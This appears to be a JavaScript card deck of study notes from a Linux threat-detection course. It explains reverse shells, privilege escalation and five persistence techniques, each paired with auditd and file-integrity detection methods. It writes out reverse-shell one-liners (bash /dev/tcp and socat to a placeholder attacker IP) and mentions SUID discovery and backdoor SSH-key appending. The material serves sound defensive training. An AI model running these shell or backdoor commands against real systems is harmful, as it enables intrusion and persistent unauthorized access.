export default {
  id: "linux-persistence",
  title: "Linux Reverse Shells, Priv-Esc & Persistence",
  src: "Linux Threat Detection 3",
  icon: "🕳️",
  cards: [
    {
      title: "Reverse shells — why attackers upgrade a limited shell",
      span2: true,
      blocks: [
        { t: "txt", text: "A web exploit/vuln often grants only a crippled shell — delayed output, no Ctrl+C, no history, rate limits (e.g. a ping-based command injection needing 127.0.0.1 && whoami prepended to every command). A reverse shell trades that for a real interactive session: the victim connects OUT to the attacker instead of the attacker connecting in." },
        { t: "cmd", label: "bash", code: "bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1" },
        { t: "cmd", label: "socat", code: "socat tcp:<attacker-ip>:<port> exec:bash" },
        { t: "cmd", label: "python3", code: "python3 -c '...socket...spawn bash...'" },
      ],
    },
    {
      title: "Detecting reverse shells — PID/PPID climb",
      span2: true,
      blocks: [
        { t: "cmd", label: "find the launch event", code: "ausearch -i -x socat" },
        { t: "cmd", label: "look up its ppid as a pid — reveals the parent", code: "ausearch -i --pid <ppid>" },
        { t: "note", kind: "info", title: "confirms the launching context", text: "In the TryPingMe lab, the parent was the web app's own Python process — confirming the reverse shell came from web-app command injection, not a legitimate admin action. Everything typed after the shell lands shows up as children of that same process." },
      ],
    },
    {
      title: "Privilege escalation — detect the pattern, not every exploit",
      span2: true,
      blocks: [
        { t: "table", head: ["Technique", "Example"], rows: [
          ["Kernel/binary exploit", "PwnKit against an old unpatched Ubuntu 16.04 (uname -a fingerprinting)"],
          ["SUID misconfiguration", "find / -perm -4000 turns up env or similar with SUID set (GTFOBins abuse)"],
          ["Exposed credential file", "unprotected SSH backup key readable by a low-priv user"],
        ]},
        { t: "note", kind: "warn", title: "hundreds of SUID misconfigs, thousands of CVEs — don't memorize, detect the shape", text: "Discovery spike (whoami/id/uname -a) → download to /tmp (wget + gcc + chmod) → data exfil via scp. Confirm success by comparing the UID field before/after the exploit process (e.g. uid=1001 → uid=0), not by proving any one exploit worked." },
      ],
    },
    {
      title: "The five Linux persistence techniques",
      span2: true,
      blocks: [
        { t: "table", head: ["Technique", "Planted via", "Detect via"], rows: [
          ["Cron job", "new line in /var/spool/cron/<user> or a file in /etc/cron.d/ (APT29 Goldmax; Rocke cryptominer's */10 re-download job)", "monitor cron files for changes (ausearch -i -f /etc/crontab); watch for crontab process execution"],
          ["Systemd service", "unit file in /lib/systemd/system/ or /etc/systemd/system/, often disguised with a fake description (Sandworm/Cyclops Blink)", "monitor /etc/systemd/system/ for changes; watch for systemctl execution"],
          ["New backdoor user", "useradd/usermod creates a user, adds to a privileged group (sudo)", "grep -E \"useradd|usermod\" on auth.log, then walk the process tree from the resulting ppid"],
          ["Backdoor SSH key", "attacker's public key appended to ~/.ssh/authorized_keys (same trick as Dota3)", "file-integrity monitoring on authorized_keys — NOT process logs"],
          ["Application-level (web shell)", "backdoor planted inside a compromised app itself, e.g. a WSO shell via breached WordPress admin", "explicit blind spot — no cron/systemd/SSH-key artifact at all"],
        ]},
        { t: "note", kind: "danger", title: "SSH key backdoor is nearly invisible to process logs", text: "echo \"<key>\" >> authorized_keys is a shell BUILTIN — auditd logs it simply as a generic bash process, not as echo with visible arguments. Process-creation logging alone will miss it; file-integrity monitoring on the key file itself is the reliable detection." },
      ],
    },
    {
      title: "Targeted attacks — Linux as the corporate beachhead",
      span2: true,
      blocks: [
        { t: "txt", text: "Hack-and-forget cryptominers (Linux Threat Detection 2) are automated and rarely escalate privileges. Reverse shells, priv-esc, and deliberate persistence instead show up in targeted, human-operated intrusions — state-sponsored espionage (Kimsuky APT using systemd persistence on mission-critical Linux boxes) and hypervisor ransomware (one compromised Linux hypervisor can encrypt every Windows VM riding on top of it)." },
        { t: "note", kind: "info", title: "meta-lesson for a Windows-focused SOC", text: "A single internet-facing Linux box (firewall, mail server, web server) in an otherwise 99%-Windows environment can be the pivot point into the whole corporate network. Linux visibility matters even on primarily-Windows estates." },
      ],
    },
    {
      title: "Full chain, LTD1–3 → MITRE ATT&CK",
      blocks: [
        { t: "steps", items: [
          "Initial Access — SSH breach / exposed service",
          "Execution — reverse shell",
          "Discovery — specialized enumeration",
          "Privilege Escalation — kernel exploit / SUID / exposed key",
          "Persistence — cron / systemd / user / SSH key / app-level",
          "Command & Control",
          "Exfiltration",
          "Impact — ransomware / crypto-mining",
        ]},
        { t: "note", kind: "info", title: "mirrors the Windows Threat Detection 1-3 arc", text: "Same nine-stage structure as the Windows module — Windows and Linux were built as deliberate mirrors of each other." },
      ],
    },
  ],
};
